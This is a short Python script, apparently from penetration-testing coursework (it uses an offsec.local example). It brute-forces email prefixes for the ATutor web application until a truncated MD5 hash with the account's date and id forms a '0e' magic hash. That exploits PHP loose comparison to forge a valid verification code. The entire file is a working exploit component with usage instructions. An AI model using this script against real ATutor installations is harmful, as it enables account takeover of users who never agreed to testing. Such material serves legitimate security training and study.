#!/bin/env/python3
import hashlib, itertools, re, sys

def gen_code(domain, id, date, prefix_length):
    """
    This function will brute froce to find a float in the form 0e1234567
    :param domain: domain of the target email, e.g. offsec.local
    :type domain: string
    :param id: id of target username in ATutor
    :type id: string
    :param date: date time string, YYYY-MM-DD HH:MM:SS
    :type date: date time string
    :param prefix_length: length of brute force string
    :type prefix_length: string
    """

    count = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890'
    for word in map(''.join, itertools.product(alphabet, repeat=int(prefix_length))):
        plain_text = ("%s@%s" % (word, domain) + date + id).encode('utf-8')
        hash = hashlib.md5(plain_text).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print('(+) Found a valid email! %s@%s' % (word, domain))
            print('(+) Request made: %d' % count)
            print('(+) Equivalent loose comparison: %s == 0\n' %(hash))
        count += 1

def main():
    """
    This is the main function
    """

    if len(sys.argv) != 5:
        print('(+) usage: %s <domain name> <id> <creation_date> <prefix_length>' % (sys.argv[0]))
        print('(+) e.g: %s offsec.local 3 "2018-06-10 23:59:59" 3' % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    creation_date = sys.argv[3]
    prefix_length = sys.argv[4]

    gen_code(domain, id, creation_date, prefix_length)

if __name__ == "__main__":
    main()
